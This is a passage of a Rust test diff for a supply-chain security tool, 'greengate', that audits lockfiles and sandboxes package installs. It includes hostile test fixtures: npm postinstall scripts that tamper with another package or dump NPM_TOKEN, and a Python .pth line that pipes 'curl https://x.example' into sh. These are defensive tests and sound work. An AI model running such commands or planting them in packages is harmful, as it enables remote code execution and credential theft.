+            let req: serde_json::Value = serde_json::from_slice(&body).unwrap_or_default();
+            let queries = req["queries"].as_array().cloned().unwrap_or_default();
+            for q in &queries {
+                log.lock().unwrap().push((
+                    q["package"]["name"].as_str().unwrap_or("").to_string(),
+                    q["version"].as_str().unwrap_or("").to_string(),
+                ));
+            }
+            let results: Vec<serde_json::Value> =
+                queries.iter().map(|_| serde_json::json!({})).collect();
+            let resp = serde_json::json!({ "results": results }).to_string();
+            let _ = write!(
+                stream,
+                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp}",
+                resp.len()
+            );
+        }
+    });
+    (format!("http://{addr}"), seen)
+}
+
+#[test]
+fn audit_queries_nested_npm_copies_and_quoted_scoped_pnpm_names() {
+    for fixture in ["npm", "pnpm", "bun", "yarn1"] {
+        let dir = copy_fixture(fixture);
+        let (osv, seen) = recording_osv();
+        let (code, report) = audit_json(dir.path(), &osv, &[]);
+        assert_eq!(code, Some(0), "{fixture}: {report}");
+        let seen = seen.lock().unwrap().clone();
+        for (name, version) in [
+            ("ms", "2.0.0"),
+            ("ms", "2.1.3"),
+            ("@sindresorhus/is", "4.6.0"),
+        ] {
+            assert!(
+                seen.contains(&(name.to_string(), version.to_string())),
+                "{fixture}: {name}@{version} was never queried; queried {seen:?}"
+            );
+        }
+    }
+}
+
+#[test]
+fn audit_reads_python_lockfiles() {
+    for fixture in ["uv", "poetry", "pylock"] {
+        let dir = copy_fixture(fixture);
+        let (osv, seen) = recording_osv();
+        let (code, report) = audit_json(dir.path(), &osv, &[]);
+        assert_eq!(code, Some(0), "{fixture}: {report}");
+        assert!(
+            seen.lock()
+                .unwrap()
+                .contains(&("requests".to_string(), "2.31.0".to_string())),
+            "{fixture}"
+        );
+    }
+}
+
+#[test]
+fn sbom_from_bun_has_the_graph() {
+    let dir = copy_fixture("bun");
+    let out = run_in(dir.path(), &["sbom", "--output", "bom.json"]);
+    assert!(
+        out.status.success(),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let bom: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(dir.path().join("bom.json")).unwrap()).unwrap();
+    assert_eq!(bom["components"].as_array().unwrap().len(), 5);
+    let serial = bom["serialNumber"].as_str().unwrap();
+    assert!(
+        serial.starts_with("urn:uuid:") && serial.len() == 45,
+        "{serial}"
+    );
+    let debug = bom["dependencies"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|d| d["ref"] == "pkg:npm/debug@2.6.9")
+        .unwrap();
+    assert_eq!(debug["dependsOn"], serde_json::json!(["pkg:npm/ms@2.0.0"]));
+}
+
+#[test]
+fn sbom_refuses_to_guess_between_lockfiles() {
+    let dir = copy_fixture("npm");
+    std::fs::copy(
+        fixture_dir("yarn1").join("yarn.lock"),
+        dir.path().join("yarn.lock"),
+    )
+    .unwrap();
+    let out = run_in(dir.path(), &["sbom"]);
+    assert_eq!(out.status.code(), Some(4));
+    assert!(String::from_utf8_lossy(&out.stderr).contains("--lockfile"));
+    let out = run_in(
+        dir.path(),
+        &["sbom", "--lockfile", "yarn.lock", "--output", "b.json"],
+    );
+    assert!(
+        out.status.success(),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+#[test]
+fn deps_why_explains_a_transitive_package() {
+    let dir = copy_fixture("pnpm");
+    let out = run_in(dir.path(), &["deps", "why", "ms@2.0.0"]);
+    assert!(out.status.success());
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        stdout.contains("fixture → debug@2.6.9 → ms@2.0.0"),
+        "{stdout}"
+    );
+    let out = run_in(dir.path(), &["deps", "why", "left-pad"]);
+    assert_eq!(out.status.code(), Some(4));
+}
+
+// ── deps check: release risk and lockfile policy ──────────────────────────────
+
+/// A fake registry: answers each GET with `respond(path)` and logs the paths.
+fn fake_registry(
+    respond: fn(&str) -> (u16, String),
+) -> (String, std::sync::Arc<std::sync::Mutex<Vec<String>>>) {
+    use std::io::{BufRead, BufReader, Write};
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let addr = listener.local_addr().unwrap();
+    let log = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
+    let seen = log.clone();
+    std::thread::spawn(move || {
+        for stream in listener.incoming() {
+            let Ok(mut stream) = stream else { continue };
+            let mut reader = BufReader::new(stream.try_clone().unwrap());
+            let mut request = String::new();
+            reader.read_line(&mut request).unwrap_or(0);
+            loop {
+                let mut h = String::new();
+                if reader.read_line(&mut h).unwrap_or(0) == 0 || h.trim().is_empty() {
+                    break;
+                }
+            }
+            let path = request.split_whitespace().nth(1).unwrap_or("").to_string();
+            seen.lock().unwrap().push(path.clone());
+            let (status, body) = respond(&path);
+            let _ = write!(
+                stream,
+                "HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                body.len()
+            );
+        }
+    });
+    (format!("http://{addr}"), log)
+}
+
+/// npm packuments: `ms` 2.1.2 → 2.1.3 adds a postinstall script; `quiet` is
+/// an ordinary old release.
+fn npm_packuments(path: &str) -> (u16, String) {
+    let body = match path {
+        "/ms" => serde_json::json!({
+            "time": {"2.1.2": "2019-06-06T00:00:00.000Z", "2.1.3": "2020-12-18T00:00:00.000Z"},
+            "versions": {
+                "2.1.2": {"_npmUser": {"name": "leo"}},
+                "2.1.3": {"_npmUser": {"name": "leo"}, "scripts": {"postinstall": "node steal.js"}}
+            }
+        }),
+        "/quiet" => serde_json::json!({
+            "time": {"1.0.0": "2015-01-01T00:00:00.000Z"},
+            "versions": {"1.0.0": {"_npmUser": {"name": "q"}}}
+        }),
+        _ => return (404, "{}".into()),
+    };
+    (200, body.to_string())
+}
+
+fn npm_lock(entries: &[(&str, &str, &str)]) -> String {
+    let mut packages = serde_json::Map::new();
+    let mut deps = serde_json::Map::new();
+    for (name, version, resolved) in entries {
+        deps.insert(name.to_string(), serde_json::json!(version));
+        packages.insert(
+            format!("node_modules/{name}"),
+            serde_json::json!({"version": version, "resolved": resolved, "integrity": "sha512-x"}),
+        );
+    }
+    packages.insert(
+        "".into(),
+        serde_json::json!({"name": "app", "dependencies": deps}),
+    );
+    serde_json::json!({"lockfileVersion": 3, "packages": packages}).to_string()
+}
+
+fn deps_check(
+    dir: &std::path::Path,
+    registry: &str,
+    args: &[&str],
+) -> (Option<i32>, serde_json::Value) {
+    let out = Command::new(binary())
+        .args(["deps", "check", "--report", "r.json"])
+        .args(args)
+        .env("GREENGATE_NPM_REGISTRY", registry)
+        .env("GREENGATE_CACHE_DIR", dir.join(".cache"))
+        .env("GREENGATE_OSV_URL", "http://127.0.0.1:1")
+        .env_remove("GITHUB_BASE_REF")
+        .current_dir(dir)
+        .output()
+        .unwrap();
+    let report = std::fs::read(dir.join("r.json"))
+        .map(|b| serde_json::from_slice(&b).unwrap())
+        .unwrap_or_else(|_| {
+            panic!(
+                "no report; stderr: {}",
+                String::from_utf8_lossy(&out.stderr)
+            )
+        });
+    (out.status.code(), report)
+}
+
+fn rules_of(report: &serde_json::Value, key: &str) -> Vec<String> {
+    report[key]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| f["rule"].as_str().unwrap().to_string())
+        .collect()
+}
+
+#[test]
+fn deps_check_blocks_a_release_that_adds_an_install_script() {
+    let dir = tempfile::tempdir().unwrap();
+    let npm = "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz";
+    std::fs::write(
+        dir.path().join("package-lock.json"),
+        npm_lock(&[("ms", "2.1.3", npm)]),
+    )
+    .unwrap();
+    let (registry, _) = fake_registry(npm_packuments);
+    let (code, report) = deps_check(dir.path(), &registry, &["--all"]);
+    assert_eq!(code, Some(1), "{report}");
+    assert_eq!(rules_of(&report, "findings"), ["RELEASE/NewInstallScript"]);
+}
+
+#[test]
+fn deps_check_unreachable_registry_is_incomplete() {
+    let dir = tempfile::tempdir().unwrap();
+    let npm = "https://registry.npmjs.org/quiet/-/quiet-1.0.0.tgz";
+    std::fs::write(
+        dir.path().join("package-lock.json"),
+        npm_lock(&[("quiet", "1.0.0", npm)]),
+    )
+    .unwrap();
+    let (code, report) = deps_check(dir.path(), "http://127.0.0.1:1", &["--all"]);
+    assert_eq!(code, Some(3), "{report}");
+}
+
+#[test]
+fn deps_check_enforces_registry_binding_and_dependency_confusion() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join("package-lock.json"),
+        npm_lock(&[
+            (
+                "@acme/ui",
+                "1.0.0",
+                "https://registry.npmjs.org/@acme/ui/-/ui-1.0.0.tgz",
+            ),
+            (
+                "acme-auth",
+                "1.0.0",
+                "https://registry.npmjs.org/acme-auth/-/acme-auth-1.0.0.tgz",
+            ),
+        ]),
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\ninternal_packages = [\"acme-*\"]\n\
+         [[supply_chain.registries]]\npattern = \"@acme/*\"\nurl = \"https://npm.acme.dev/\"\n",
+    )
+    .unwrap();
+    let (registry, _) = fake_registry(|_| (404, "{}".into()));
+    let (code, report) = deps_check(dir.path(), &registry, &[]);
+    assert_eq!(code, Some(1), "{report}");
+    let mut rules = rules_of(&report, "findings");
+    rules.sort();
+    assert_eq!(rules, ["REGISTRY/DependencyConfusion", "REGISTRY/Mismatch"]);
+}
+
+#[test]
+fn deps_check_registry_rules_on_pnpm_are_incomplete() {
+    // pnpm does not record which registry served a package.
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join("pnpm-lock.yaml"),
+        "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      '@acme/ui':\n        specifier: 1.0.0\n        version: 1.0.0\n\
+         packages:\n  '@acme/ui@1.0.0':\n    resolution: {integrity: sha512-x}\nsnapshots:\n  '@acme/ui@1.0.0': {}\n",
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[[supply_chain.registries]]\npattern = \"@acme/*\"\nurl = \"https://npm.acme.dev/\"\n",
+    )
+    .unwrap();
+    let (registry, _) = fake_registry(|_| (404, "{}".into()));
+    let (code, report) = deps_check(dir.path(), &registry, &[]);
+    assert_eq!(code, Some(3), "{report}");
+    assert!(
+        report["checks"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|c| c["id"].as_str().unwrap().starts_with("registry-binding:"))
+    );
+}
+
+#[test]
+fn deps_check_unpinned_git_warns_and_strict_fails() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join("package-lock.json"),
+        npm_lock(&[(
+            "tool",
+            "1.0.0",
+            "git+ssh://git@github.com/acme/tool.git#main",
+        )]),
+    )
+    .unwrap();
+    let (registry, _) = fake_registry(|_| (404, "{}".into()));
+    let (code, report) = deps_check(dir.path(), &registry, &[]);
+    assert_eq!(code, Some(0), "{report}");
+    assert_eq!(rules_of(&report, "warnings"), ["SOURCE/UnpinnedGit"]);
+    let (code, _) = deps_check(dir.path(), &registry, &["--profile", "strict"]);
+    assert_eq!(code, Some(1));
+}
+
+#[test]
+fn deps_check_only_looks_up_what_changed_since_the_base() {
+    let dir = tempfile::tempdir().unwrap();
+    init_git_repo(dir.path());
+    let url = |n: &str, v: &str| format!("https://registry.npmjs.org/{n}/-/{n}-{v}.tgz");
+    let write = |ms: &str| {
+        std::fs::write(
+            dir.path().join("package-lock.json"),
+            npm_lock(&[
+                ("ms", ms, &url("ms", ms)),
+                ("quiet", "1.0.0", &url("quiet", "1.0.0")),
+            ]),
+        )
+        .unwrap();
+    };
+    write("2.1.2");
+    git_commit_all(dir.path(), "lock");
+    write("2.1.3");
+
+    let (registry, log) = fake_registry(npm_packuments);
+    let (code, report) = deps_check(dir.path(), &registry, &[]);
+    assert_eq!(code, Some(1), "{report}");
+    assert_eq!(
+        *log.lock().unwrap(),
+        ["/ms"],
+        "only the upgraded package is looked up"
+    );
+    let message = report["findings"][0]["message"].as_str().unwrap();
+    assert!(message.contains("upgraded from 2.1.2"), "{message}");
+}
+
+/// `fresh` 1.0.1 was published an hour ago; 1.0.0 years ago. The fake OSV
+/// path answers the exemption query: an advisory on 1.0.0, none on 1.0.1.
+fn fresh_release_registry(path: &str) -> (u16, String) {
+    let hour_ago = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs()
+        - 3600;
+    // Format unix seconds as ISO 8601 (days-from-civil, inverted).
+    let (days, secs) = (hour_ago / 86_400, hour_ago % 86_400);
+    let z = days as i64 + 719_468;
+    let era = z.div_euclid(146_097);
+    let doe = z - era * 146_097;
+    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
+    let mp = (5 * doy + 2) / 153;
+    let d = doy - (153 * mp + 2) / 5 + 1;
+    let m = if mp < 10 { mp + 3 } else { mp - 9 };
+    let y = yoe + era * 400 + i64::from(m <= 2);
+    let iso = format!(
+        "{y:04}-{m:02}-{d:02}T{:02}:{:02}:{:02}.000Z",
+        secs / 3600,
+        secs / 60 % 60,
+        secs % 60
+    );
+    match path {
+        "/fresh" => (
+            200,
+            serde_json::json!({
+                "time": {"1.0.0": "2015-01-01T00:00:00.000Z", "1.0.1": iso},
+                "versions": {"1.0.0": {}, "1.0.1": {}}
+            })
+            .to_string(),
+        ),
+        "/v1/querybatch" => (
+            200,
+            r#"{"results":[{"vulns":[{"id":"GHSA-old-0001"}]},{}]}"#.to_string(),
+        ),
+        _ => (404, "{}".into()),
+    }
+}
+
+#[test]
+fn deps_check_cooldown_exempts_a_security_fix() {
+    let dir = tempfile::tempdir().unwrap();
+    init_git_repo(dir.path());
+    let url = |v: &str| format!("https://registry.npmjs.org/fresh/-/fresh-{v}.tgz");
+    std::fs::write(
+        dir.path().join("package-lock.json"),
+        npm_lock(&[("fresh", "1.0.0", &url("1.0.0"))]),
+    )
+    .unwrap();
+    git_commit_all(dir.path(), "lock");
+    std::fs::write(
+        dir.path().join("package-lock.json"),
+        npm_lock(&[("fresh", "1.0.1", &url("1.0.1"))]),
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain.release]\nyoung_release = \"fail\"\n",
+    )
+    .unwrap();
+
+    let (registry, _) = fake_registry(fresh_release_registry);
+    let out = Command::new(binary())
+        .args(["deps", "check", "--report", "r.json"])
+        .env("GREENGATE_NPM_REGISTRY", &registry)
+        .env("GREENGATE_OSV_URL", &registry)
+        .env("GREENGATE_CACHE_DIR", dir.path().join(".cache"))
+        .env_remove("GITHUB_BASE_REF")
+        .current_dir(dir.path())
+        .output()
+        .unwrap();
+    let report: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(dir.path().join("r.json")).unwrap()).unwrap();
+    assert_eq!(out.status.code(), Some(0), "{report}");
+    let warning = report["warnings"][0]["message"].as_str().unwrap();
+    assert!(
+        warning.contains("exempt from the cooldown") && warning.contains("GHSA-old-0001"),
+        "{warning}"
+    );
+}
+
+// ── greengate install (real npm; skipped where npm is unavailable) ────────────
+
+fn tool_available(cmd: &str, args: &[&str]) -> bool {
+    Command::new(cmd)
+        .args(args)
+        .output()
+        .is_ok_and(|o| o.status.success())
+}
+
+/// A project with local tarball dependencies, each `(name, scripts JSON)`.
+/// Packages ship `index.js` with `module.exports = "<name>"`.
+fn npm_project(packages: &[(&str, &str)]) -> tempfile::TempDir {
+    let dir = tempfile::tempdir().unwrap();
+    let src = dir.path().join(".src");
+    let mut deps = Vec::new();
+    for (name, scripts) in packages {
+        let pkg = src.join(name);
+        std::fs::create_dir_all(&pkg).unwrap();
+        std::fs::write(
+            pkg.join("package.json"),
+            format!(r#"{{"name":"{name}","version":"1.0.0","scripts":{scripts}}}"#),
+        )
+        .unwrap();
+        std::fs::write(
+            pkg.join("index.js"),
+            format!("module.exports = \"{name}\";\n"),
+        )
+        .unwrap();
+        let ok = Command::new("npm")
+            .args(["pack", "--silent", "--pack-destination"])
+            .arg(dir.path())
+            .current_dir(&pkg)
+            .output()
+            .unwrap()
+            .status
+            .success();
+        assert!(ok, "npm pack {name}");
+        deps.push(format!(r#""{name}":"file:{name}-1.0.0.tgz""#));
+    }
+    std::fs::write(
+        dir.path().join("package.json"),
+        format!(
+            r#"{{"name":"app","version":"1.0.0","scripts":{{"postinstall":"node -e \"require('fs').writeFileSync('root-ran','1')\""}},"dependencies":{{{}}}}}"#,
+            deps.join(",")
+        ),
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\n",
+    )
+    .unwrap();
+    dir
+}
+
+const TAMPER: &str =
+    r#"{"postinstall":"node -e \"require('fs').writeFileSync('../victim/index.js','pwned')\""}"#;
+const BUILD: &str = r#"{"postinstall":"node -e \"require('fs').mkdirSync('build',{recursive:true});require('fs').writeFileSync('build/out','ok')\""}"#;
+const LEAK: &str = r#"{"postinstall":"node -e \"require('fs').writeFileSync('leak', String(process.env.NPM_TOKEN))\""}"#;
+
+/// An OSV server that knows no advisories, shared by every test that
+/// installs: install plans query OSV for the packages they add.
+fn quiet_osv() -> &'static str {
+    static URL: std::sync::OnceLock<String> = std::sync::OnceLock::new();
+    URL.get_or_init(|| {
+        fake_http(|_, path, body| {
+            if path != "/v1/querybatch" {
+                return (404, "{}".into());
+            }
+            let n = serde_json::from_str::<serde_json::Value>(body)
+                .ok()
+                .and_then(|q| q["queries"].as_array().map(Vec::len))
+                .unwrap_or(0);
+            let results = vec![serde_json::json!({}); n];
+            (200, serde_json::json!({ "results": results }).to_string())
+        })
+        .0
+    })
+}
+
+fn install(dir: &std::path::Path, args: &[&str]) -> (Option<i32>, serde_json::Value, String) {
+    let out = Command::new(binary())
+        .args(["install", "--report", "r.json"])
+        .env("GREENGATE_OSV_URL", quiet_osv())
+        .args(args)
+        .env("NPM_TOKEN", "secret-token-value")
+        .env("npm_config_cache", dir.join(".npm-cache"))
+        .current_dir(dir)
+        .output()
+        .unwrap();
+    let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
+    let report = std::fs::read(dir.join("r.json"))
+        .map(|b| serde_json::from_slice(&b).unwrap())
+        .unwrap_or(serde_json::Value::Null);
+    (out.status.code(), report, stderr)
+}
+
+#[test]
+fn install_isolated_refuses_writes_outside_the_package() {
+    if !tool_available("npm", &["--version"]) || !tool_available("bwrap", &["--version"]) {
+        eprintln!("skipped: needs npm and bubblewrap");
+        return;
+    }
+    let dir = npm_project(&[("victim", "{}"), ("tamper", TAMPER), ("builder", BUILD)]);
+    let (code, report, stderr) = install(dir.path(), &["--isolate", "bwrap", "npm", "install"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert!(
+        rules_of(&report, "findings").contains(&"INSTALL/BlockedWrite".to_string()),
+        "{report}"
+    );
+    let victim = std::fs::read_to_string(dir.path().join("node_modules/victim/index.js")).unwrap();
+    assert_eq!(
+        victim, "module.exports = \"victim\";\n",
+        "the write was refused"
+    );
+    assert!(
+        dir.path().join("node_modules/builder/build/out").is_file(),
+        "benign build still ran"
+    );
+    assert!(
+        dir.path().join("root-ran").is_file(),
+        "the project's own postinstall ran"
+    );
+}
+
+#[test]
+fn install_unisolated_detects_writes_outside_the_package() {
+    if !tool_available("npm", &["--version"]) {
+        eprintln!("skipped: needs npm");
+        return;
+    }
+    let dir = npm_project(&[("victim", "{}"), ("tamper", TAMPER)]);
+    let (code, report, stderr) = install(dir.path(), &["--isolate", "none", "npm", "install"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    // `../` in the script is flagged before it runs; unisolated, it is held back.
+    let findings = rules_of(&report, "findings");
+    assert!(
+        findings.contains(&"INSTALL/SuspiciousScript".to_string()),
+        "{report}"
+    );
+    let victim = std::fs::read_to_string(dir.path().join("node_modules/victim/index.js")).unwrap();
+    assert_eq!(victim, "module.exports = \"victim\";\n");
+}
+
+#[test]
+fn install_scrubs_credentials_from_scripts() {
+    if !tool_available("npm", &["--version"]) {
+        eprintln!("skipped: needs npm");
+        return;
+    }
+    let dir = npm_project(&[("leaky", LEAK)]);
+    // Reading process.env is flagged; allowlisting lets it run unisolated,
+    // which is where scrubbing is the only protection.
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\nallow_postinstall = [\"leaky\"]\n",
+    )
+    .unwrap();
+    let (code, report, stderr) = install(dir.path(), &["--isolate", "none", "npm", "install"]);
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    let leaked = std::fs::read_to_string(dir.path().join("node_modules/leaky/leak")).unwrap();
+    assert_eq!(
+        leaked, "undefined",
+        "NPM_TOKEN must not reach install scripts"
+    );
+}
+
+#[test]
+fn install_plan_changes_nothing() {
+    if !tool_available("npm", &["--version"]) {
+        eprintln!("skipped: needs npm");
+        return;
+    }
+    let dir = npm_project(&[("builder", BUILD)]);
+    let (code, report, stderr) = install(dir.path(), &["--plan", "npm", "install"]);
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    assert!(!dir.path().join("node_modules").exists());
+    assert!(!dir.path().join("package-lock.json").exists());
+    assert!(!dir.path().join("root-ran").exists());
+}
+
+#[test]
+fn install_ignore_scripts_runs_no_dependency_script() {
+    if !tool_available("npm", &["--version"]) {
+        eprintln!("skipped: needs npm");
+        return;
+    }
+    let dir = npm_project(&[("builder", BUILD)]);
+    let (code, report, stderr) = install(
+        dir.path(),
+        &["--isolate", "none", "npm", "install", "--ignore-scripts"],
+    );
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    assert!(dir.path().join("node_modules/builder/index.js").is_file());
+    assert!(
+        !dir.path().join("node_modules/builder/build/out").exists(),
+        "a dependency script ran despite --ignore-scripts"
+    );
+    assert!(!dir.path().join("root-ran").exists());
+}
+
+#[test]
+fn install_plan_flags_cannot_be_turned_off() {
+    if !tool_available("npm", &["--version"]) {
+        eprintln!("skipped: needs npm");
+        return;
+    }
+    let dir = npm_project(&[("builder", BUILD)]);
+    let (code, _, stderr) = install(
+        dir.path(),
+        &[
+            "--plan",
+            "npm",
+            "install",
+            "--ignore-scripts=false",
+            "--package-lock-only=false",
+        ],
+    );
+    assert_eq!(code, Some(4), "{stderr}");
+    assert!(
+        stderr.contains("conflicts with how greengate install runs npm"),
+        "{stderr}"
+    );
+    assert!(!dir.path().join("node_modules").exists());
+    assert!(!dir.path().join("root-ran").exists());
+}
+
+#[test]
+fn install_pip_honours_require_isolation() {
+    let dir = tempfile::tempdir().unwrap();
+    // A pip that records being run: it must not be.
+    let pip = dir.path().join("fake-pip");
+    std::fs::write(&pip, "#!/bin/sh\ntouch \"$(dirname \"$0\")/pip-ran\"\n").unwrap();
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&pip, std::fs::Permissions::from_mode(0o755)).unwrap();
+    }
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\nrequire_isolation = true\n",
+    )
+    .unwrap();
+    let (code, report, stderr) = install(
+        dir.path(),
+        &[
+            "--isolate",
+            "none",
+            "--pip",
+            pip.to_str().unwrap(),
+            "pip",
+            "install",
+            "requests",
+        ],
+    );
+    assert_eq!(code, Some(3), "{stderr}\n{report}");
+    assert!(!dir.path().join("pip-ran").exists(), "pip ran unisolated");
+}
+
+#[test]
+fn install_rejects_non_install_commands() {
+    let dir = tempfile::tempdir().unwrap();
+    let (code, _, stderr) = install(dir.path(), &["npm", "run", "build"]);
+    assert_eq!(code, Some(4));
+    assert!(stderr.contains("not an install"), "{stderr}");
+}
+
+// ── greengate install: pnpm, pip, cargo (local packages; skipped without tools) ─
+
+fn pnpm_project(only_built: &[&str]) -> tempfile::TempDir {
+    let dir = npm_project(&[
+        ("victim", "{}"),
+        ("tamper", PNPM_TAMPER),
+        ("builder", BUILD),
+    ]);
+    if !only_built.is_empty() {
+        let list: String = only_built.iter().map(|n| format!("  - {n}\n")).collect();
+        std::fs::write(
+            dir.path().join("pnpm-workspace.yaml"),
+            format!("onlyBuiltDependencies:\n{list}"),
+        )
+        .unwrap();
+    }
+    dir
+}
+
+/// pnpm keeps packages in its store; aim at the victim through the
+/// project's node_modules symlink.
+const PNPM_TAMPER: &str = r#"{"postinstall":"node -e \"require('fs').writeFileSync(process.env.INIT_CWD+'/node_modules/victim/index.js','pwned')\""}"#;
+
+fn pnpm_victim(dir: &std::path::Path) -> String {
+    std::fs::read_to_string(dir.join("node_modules/victim/index.js")).unwrap()
+}
+
+#[test]
+fn install_pnpm_isolated_refuses_writes_into_the_store() {
+    if !tool_available("pnpm", &["--version"]) || !tool_available("bwrap", &["--version"]) {
+        eprintln!("skipped: needs pnpm and bubblewrap");
+        return;
+    }
+    let dir = pnpm_project(&["tamper", "builder"]);
+    let (code, report, stderr) = install(dir.path(), &["--isolate", "bwrap", "pnpm", "install"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert!(
+        rules_of(&report, "findings").contains(&"INSTALL/BlockedWrite".to_string()),
+        "{report}"
+    );
+    assert!(
+        !rules_of(&report, "findings").contains(&"INSTALL/UnplannedPackage".to_string()),
+        "{report}"
+    );
+    assert_eq!(pnpm_victim(dir.path()), "module.exports = \"victim\";\n");
+}
+
+#[test]
+fn install_pnpm_follows_pnpm_build_policy() {
+    if !tool_available("pnpm", &["--version"]) {
+        eprintln!("skipped: needs pnpm");
+        return;
+    }
+    let major: u32 = String::from_utf8_lossy(
+        &Command::new("pnpm")
+            .arg("--version")
+            .output()
+            .unwrap()
+            .stdout,
+    )
+    .split('.')
+    .next()
+    .and_then(|m| m.trim().parse().ok())
+    .unwrap_or(0);
+    if major < 10 {
+        eprintln!("skipped: pnpm < 10 builds everything by default");
+        return;
+    }
+    let dir = pnpm_project(&[]);
+    let (code, report, stderr) = install(dir.path(), &["pnpm", "install"]);
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    let warnings = rules_of(&report, "warnings");
+    assert_eq!(
+        warnings
+            .iter()
+            .filter(|w| *w == "INSTALL/BuildNotAllowed")
+            .count(),
+        2,
+        "{report}"
+    );
+    assert_eq!(pnpm_victim(dir.path()), "module.exports = \"victim\";\n");
+}
+
+/// A minimal wheel for `name` 1.0 with extra `(path, content)` entries.
+fn wheel(dir: &std::path::Path, name: &str, extra: &[(&str, &str)]) {
+    let path = dir.join(format!("{name}-1.0-py3-none-any.whl"));
+    let mut w = zip::ZipWriter::new(std::fs::File::create(path).unwrap());
+    let o = zip::write::SimpleFileOptions::default()
+        .compression_method(zip::CompressionMethod::Stored);
+    let info = format!("{name}-1.0.dist-info");
+    let mut files: Vec<(String, String)> = vec![
+        (format!("{name}/__init__.py"), "VALUE = 42\n".into()),
+        (
+            format!("{info}/METADATA"),
+            format!("Metadata-Version: 2.1\nName: {name}\nVersion: 1.0\n"),
+        ),
+        (
+            format!("{info}/WHEEL"),
+            "Wheel-Version: 1.0\nGenerator: test\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
+                .into(),
+        ),
+    ];
+    files.extend(extra.iter().map(|(p, c)| (p.to_string(), c.to_string())));
+    let mut record = String::new();
+    for (p, c) in &files {
+        w.start_file(p.as_str(), o).unwrap();
+        std::io::Write::write_all(&mut w, c.as_bytes()).unwrap();
+        record.push_str(&format!("{p},,\n"));
+    }
+    record.push_str(&format!("{info}/RECORD,,\n"));
+    w.start_file(format!("{info}/RECORD"), o).unwrap();
+    std::io::Write::write_all(&mut w, record.as_bytes()).unwrap();
+    w.finish().unwrap();
+}
+
+fn venv(dir: &std::path::Path) -> Option<String> {
+    let ok = Command::new("python3")
+        .args(["-m", "venv", "venv"])
+        .current_dir(dir)
+        .output()
+        .is_ok_and(|o| o.status.success());
+    ok.then(|| dir.join("venv/bin/pip").display().to_string())
+}
+
+#[test]
+fn install_pip_stops_a_wheel_with_startup_code() {
+    let dir = tempfile::tempdir().unwrap();
+    let Some(pip) = venv(dir.path()) else {
+        eprintln!("skipped: needs python3 -m venv");
+        return;
+    };
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\n",
+    )
+    .unwrap();
+    wheel(dir.path(), "goodpkg", &[]);
+    wheel(
+        dir.path(),
+        "badpkg",
+        &[(
+            "badpkg.pth",
+            "import os; os.system('curl https://x.example | sh')\n",
+        )],
+    );
+    let links = dir.path().display().to_string();
+    let run = |pkg: &str| {
+        let out = Command::new(binary())
+            .args([
+                "install",
+                "--pip",
+                &pip,
+                "--report",
+                "r.json",
+                "pip",
+                "install",
+                "--no-index",
+                "--find-links",
+                &links,
+                pkg,
+            ])
+            .current_dir(dir.path())
+            .output()
+            .unwrap();
+        let report: serde_json::Value =
+            serde_json::from_slice(&std::fs::read(dir.path().join("r.json")).unwrap()).unwrap();
+        (
+            out.status.code(),
+            report,
+            String::from_utf8_lossy(&out.stderr).into_owned(),
+        )
+    };
+    let installed = |pkg: &str| {
+        Command::new(dir.path().join("venv/bin/python"))
+            .args(["-c", &format!("import {pkg}")])
+            .output()
+            .is_ok_and(|o| o.status.success())
+    };
+
+    let (code, report, stderr) = run("badpkg==1.0");
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert_eq!(rules_of(&report, "findings"), ["INSTALL/StartupCode"]);
+    assert!(
+        !installed("badpkg"),
+        "a wheel with startup code must not be installed"
+    );
+
+    let (code, report, stderr) = run("goodpkg==1.0");
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    assert!(installed("goodpkg"));
+}
+
+#[test]
+fn install_cargo_plan_restores_the_manifests() {
+    if !tool_available("cargo", &["--version"]) {
+        eprintln!("skipped: needs cargo");
+        return;
+    }
+    let dir = tempfile::tempdir().unwrap();
